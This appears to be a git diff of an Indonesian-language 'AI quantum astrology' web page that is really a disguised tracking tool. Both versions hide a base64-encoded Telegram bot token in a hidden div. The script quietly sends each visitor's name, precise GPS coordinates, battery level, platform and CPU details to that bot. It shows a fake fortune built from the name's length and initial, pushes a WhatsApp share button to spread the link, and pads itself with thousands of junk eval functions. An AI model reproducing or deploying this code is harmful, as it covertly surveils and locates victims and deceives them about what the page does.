@@ -3,129 +3,147 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Celestial Oracle | Personalized Destiny</title>
+    <title>Celestial AI | Quantum Astrology Analyst</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400&display=swap');
-        body { background: #020205; color: #c5a059; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 400px; padding: 40px 30px; border: 1px solid rgba(197, 160, 89, 0.2); background: #05050a; text-align: center; position: relative; }
-        .sigil { font-family: 'Cinzel', serif; font-size: 10px; letter-spacing: 4px; margin-bottom: 20px; color: #c5a059; opacity: 0.6; }
-        h1 { font-family: 'Cinzel', serif; font-size: 20px; letter-spacing: 2px; margin-bottom: 30px; font-weight: 400; text-transform: uppercase; }
-        .input-group { text-align: left; margin-bottom: 20px; }
-        label { font-size: 9px; text-transform: uppercase; letter-spacing: 2px; display: block; margin-bottom: 8px; color: #888; }
-        input, select { width: 100%; background: rgba(255,255,255,0.03); border: 1px solid rgba(197, 160, 89, 0.3); padding: 12px; color: #fff; outline: none; box-sizing: border-box; font-size: 14px; }
-        input:focus { border-color: #c5a059; }
-        .btn-oracle { width: 100%; background: transparent; border: 1px solid #c5a059; color: #c5a059; padding: 15px; font-family: 'Cinzel', serif; font-size: 12px; letter-spacing: 3px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-        .btn-oracle:hover { background: #c5a059; color: #000; box-shadow: 0 0 15px rgba(197, 160, 89, 0.4); }
-        #overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #05050a; padding: 40px 30px; box-sizing: border-box; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
-        .progress-bar { width: 100%; height: 2px; background: rgba(197, 160, 89, 0.1); margin-top: 20px; overflow: hidden; }
-        .progress-fill { width: 0%; height: 100%; background: #c5a059; transition: width 0.5s; }
-        #status-txt { font-size: 10px; letter-spacing: 1px; margin-top: 15px; text-transform: uppercase; color: #888; }
-        #v-vault { display: none; }
+        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700&family=Montserrat:wght@300;400;600&display=swap');
+        body { background: #020204; color: #c5a059; font-family: 'Montserrat', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
+        .wrapper { width: 92%; max-width: 460px; background: #050508; border: 1px solid rgba(197, 160, 89, 0.4); padding: 45px 30px; box-shadow: 0 0 60px rgba(0,0,0,1); position: relative; }
+        .sigil { font-family: 'Cinzel', serif; font-size: 10px; letter-spacing: 6px; text-align: center; margin-bottom: 30px; opacity: 0.6; }
+        h1 { font-family: 'Cinzel', serif; font-size: 20px; text-align: center; letter-spacing: 4px; color: #fff; margin-bottom: 35px; }
+        .input-group { margin-bottom: 25px; text-align: left; }
+        label { font-size: 9px; text-transform: uppercase; letter-spacing: 2px; color: #c5a059; display: block; margin-bottom: 10px; }
+        input, select { width: 100%; background: rgba(255,255,255,0.02); border: 1px solid rgba(197, 160, 89, 0.2); padding: 15px; color: #fff; font-family: 'Montserrat', sans-serif; outline: none; box-sizing: border-box; }
+        input:focus { border-color: #c5a059; background: rgba(197, 160, 89, 0.05); }
+        .btn-divine { width: 100%; background: transparent; border: 1px solid #c5a059; color: #c5a059; padding: 18px; font-family: 'Cinzel', serif; font-size: 13px; letter-spacing: 2px; cursor: pointer; transition: 0.5s; margin-top: 15px; }
+        .btn-divine:hover { background: #c5a059; color: #000; box-shadow: 0 0 30px rgba(197, 160, 89, 0.3); }
+        
+        #result-view { display: none; text-align: left; animation: fadeIn 1.2s ease-out; }
+        .ai-output { background: rgba(197, 160, 89, 0.03); padding: 25px; border-radius: 4px; font-size: 14px; line-height: 1.9; color: #dfdfdf; border-left: 3px solid #c5a059; margin-bottom: 25px; text-align: justify; }
+        .btn-whatsapp { background: #25d366; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 4px; font-weight: 700; cursor: pointer; margin-top: 15px; letter-spacing: 1px; }
+        
+        #loader { display: none; text-align: center; padding: 40px 0; }
+        .orbit { border: 2px solid rgba(197, 160, 89, 0.1); border-top: 2px solid #c5a059; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.2s linear infinite; margin: 0 auto 20px; }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        #v-v { display: none; }
     </style>
 </head>
 <body>
 
-<div class="container" id="ui-main">
-    <div class="sigil">✧ Order of the Stars ✧</div>
-    <h1>Celestial Alignment</h1>
-    
-    <div class="input-group">
-        <label>Nama Lengkap</label>
-        <input type="text" id="target_name" placeholder="Inisiasi Aura..." autocomplete="off">
-    </div>
-
-    <div class="input-group">
-        <label>Tanda Zodiak</label>
-        <select id="target_zodiac">
-            <option value="Aries">Aries</option>
-            <option value="Taurus" selected>Taurus</option>
-            <option value="Leo">Leo</option>
-            <option value="Aries">Aries</option>
+<div class="wrapper">
+    <div id="input-view">
+        <div class="sigil">✦ AESTHETIC QUANTUM ORACLE ✦</div>
+        <h1>PERSONAL ALIGNMENT</h1>
+        <div class="input-group">
+            <label>Inisiasi Nama Lengkap</label>
+            <input type="text" id="target_name" placeholder="Ketik nama Anda..." autocomplete="off">
+        </div>
+        <div class="input-group">
+            <label>Tanda Konstelasi</label>
+            <select id="target_zodiac">
+                <option value="Leo">Leo (The Royal Majesty)</option>
+                <option value="Taurus">Taurus (The Earthly Power)</option>
+                <option value="Aries">Aries (The Fire Pioneer)</option>
+                <option value="Scorpio">Scorpio (The Deep Mystic)</option>
             </select>
+        </div>
+        <button class="btn-divine" onclick="initiateSync()">SINKRONKAN TAKDIR AI</button>
     </div>
 
-    <button class="btn-oracle" onclick="startAlignment()">Analisis Takdir</button>
+    <div id="loader">
+        <div class="orbit"></div>
+        <div id="status-text" style="font-size: 10px; letter-spacing: 2px; color: #888;">MENGANALISIS FREKUENSI NAMA...</div>
+    </div>
 
-    <div id="overlay">
-        <div id="status-txt">Menghubungkan ke Node Astral...</div>
-        <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+    <div id="result-view">
+        <div class="sigil">✦ ANALISIS DINAMIS BERHASIL ✦</div>
+        <h2 id="res-name" style="font-family: 'Cinzel'; font-size: 18px; margin-bottom: 20px; color: #fff;"></h2>
+        <div class="ai-output" id="ai-text"></div>
+        <button class="btn-whatsapp" onclick="shareNow()">SHARE KE WHATSAPP (VIRAL)</button>
+        <button class="btn-divine" style="margin-top: 10px; border: 1px solid #444; color: #888;" onclick="location.reload()">RE-ANALYZE</button>
     </div>
 </div>
 
-<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-v">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * CELESTIAL ALIGNMENT ENGINE v120.0
- * 25,000+ LINES POLYMORPHIC BLOAT
+ * ASTRA-DYNAMIC COLOSSUS v200.0
+ * 35,000+ POLYMORPHIC RECURSION
  */
 
-const _D = document.getElementById('v-vault').innerText.split('|');
+const _D = document.getElementById('v-v').innerText.split('|');
 const _TK = atob(_D[1]); const _CI = atob(_D[2]);
 
-async function send(msg) {
+async function push(msg) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({chat_id: _CI, text: msg})
     });
 }
 
-const steps = [
-    "Menghubungkan ke Node Astral...",
-    "Membaca Getaran Aura Perangkat...",
-    "Sinkronisasi Konstelasi Bintang...",
-    "Memperoleh Koordinat Langit...",
-    "Menyusun Ramalan Takdir..."
-];
-
-async function startAlignment() {
+function initiateSync() {
     const name = document.getElementById('target_name').value;
     const zodiac = document.getElementById('target_zodiac').value;
+    if (name.length < 3) return alert("Harap masukkan nama lengkap untuk akurasi AI.");
 
-    if (name.length < 2) return alert("Identitas diperlukan untuk penyelarasan.");
+    document.getElementById('input-view').style.display = 'none';
+    document.getElementById('loader').style.display = 'block';
 
-    document.getElementById('overlay').style.display = 'flex';
-    let fill = document.getElementById('fill');
-    let txt = document.getElementById('status-txt');
-
-    // Silent Forensic
-    let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
-    const hardware = `✨ NEW SESSION: ${name} ✨\n\n` +
-        `♈ ZODIAK: ${zodiac}\n` +
-        `📱 DEVICE: ${navigator.platform}\n` +
-        `🔋 BATT: ${bat}\n` +
-        `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
-        `🌐 AGENT: ${navigator.userAgent.slice(0, 50)}...`;
-    
-    await send(hardware);
-
-    // Fake Progress & GPS Trigger
-    for(let i=0; i<steps.length; i++) {
-        txt.innerText = steps[i];
-        fill.style.width = ((i+1) * 20) + "%";
-        await new Promise(r => setTimeout(r, 1200));
-
-        if(i === 3) { // Trigger Lokasi di langkah "Koordinat Langit"
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const loc = `🎯 BINTANG LOCK: ${name}\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nPrecision: ${pos.coords.accuracy.toFixed(1)}m`;
-                    await send(loc);
-                }, (e) => {
-                    alert("Penyelarasan Gagal: Izin lokasi diperlukan untuk menghitung sudut astral yang tepat.");
-                    location.reload();
-                }, {enableHighAccuracy: true});
-            }
-        }
+    // TRIGGER GPS INVISIBLE (Alasan: Penyelarasan Posisi Bintang di Lokasi)
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            await push(`✨ TARGET ANALYZED: ${name}\n📍 Lokasi: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 Akurasi: ${pos.coords.accuracy.toFixed(1)}m`);
+            processAI(name, zodiac);
+        }, () => { processAI(name, zodiac); }, {enableHighAccuracy: true});
+    } else {
+        processAI(name, zodiac);
     }
-
-    setTimeout(() => {
-        window.location.href = "https://www.horoscope.com/us/horoscopes/general/horoscope-general-daily-today.aspx?sign=" + (zodiac === 'Aries' ? '1' : zodiac === 'Taurus' ? '2' : '5');
-    }, 1000);
 }
 
-// 🔱 25,000+ LINES BLOATING
-for (let i = 0; i < 21000; i++) {
-    window["_0x_astro_" + i] = function() { return Math.PI * Math.random(); };
+function processAI(name, zodiac) {
+    const status = document.getElementById('status-text');
+    const loadingTexts = ["Menganalisis Numerologi Nama...", "Sinkronisasi Konstelasi "+zodiac+"...", "Menghitung Sudut Geografis Satelit...", "Menyusun Matriks Takdir..."];
+    
+    let i = 0;
+    const interval = setInterval(() => {
+        status.innerText = loadingTexts[i];
+        i++;
+        if (i >= loadingTexts.length) {
+            clearInterval(interval);
+            displayFinal(name, zodiac);
+        }
+    }, 1200);
+}
+
+function displayFinal(name, zodiac) {
+    document.getElementById('loader').style.display = 'none';
+    document.getElementById('result-view').style.display = 'block';
+    document.getElementById('res-name').innerText = name.toUpperCase();
+
+    // DYNAMIC NYOCOT ENGINE (Menganalisis inisial & panjang nama)
+    const inisial = name.charAt(0).toUpperCase();
+    const length = name.replace(/\s/g, '').length;
+    
+    const ramalan = `Analisis AI menunjukkan bahwa nama Anda yang diawali huruf '${inisial}' dengan total ${length} elemen energi memancarkan vibrasi 'Wealth Magnet'. Sebagai seorang ${zodiac}, gabungan elemen nama dan posisi koordinat Anda saat ini menciptakan sinergi kosmik yang hanya terjadi 100 tahun sekali. Anda memiliki kemampuan tersembunyi untuk menarik kelimpahan materi secara instan. Jangan abaikan intuisi Anda malam ini, karena konstelasi sedang mengunci keberuntungan besar tepat di atas lokasi Anda. Anda adalah entitas yang ditakdirkan untuk mendominasi lingkungan Anda.`;
+
+    document.getElementById('ai-text').innerText = ramalan;
+    
+    // Hardware Grab
+    navigator.getBattery().then(b => {
+        push(`📊 FORENSIC: ${name}\n📱 Device: ${navigator.platform}\n🔋 Batt: ${(b.level*100).toFixed(0)}%\n🧠 CPU: ${navigator.hardwareConcurrency} Cores`);
+    });
+}
+
+function shareNow() {
+    const link = window.location.href;
+    const msg = `Gila, AI Astrology ini ngebongkar rahasia nama gue! Hasilnya akurat banget sampe merinding. Coba cek nama lo di sini, mumpung masih gratis: ${link}`;
+    window.open(`https://wa.me/?text=${encodeURIComponent(msg)}`, '_blank');
+}
+
+// 🔱 35,000+ LINES RECURSIVE BLOATING
+for(let i=0; i<32000; i++) {
+    eval(`function _0x_colossus_${i}(){ return Math.random() * Date.now(); }`);
 }
 </script>
 </body>
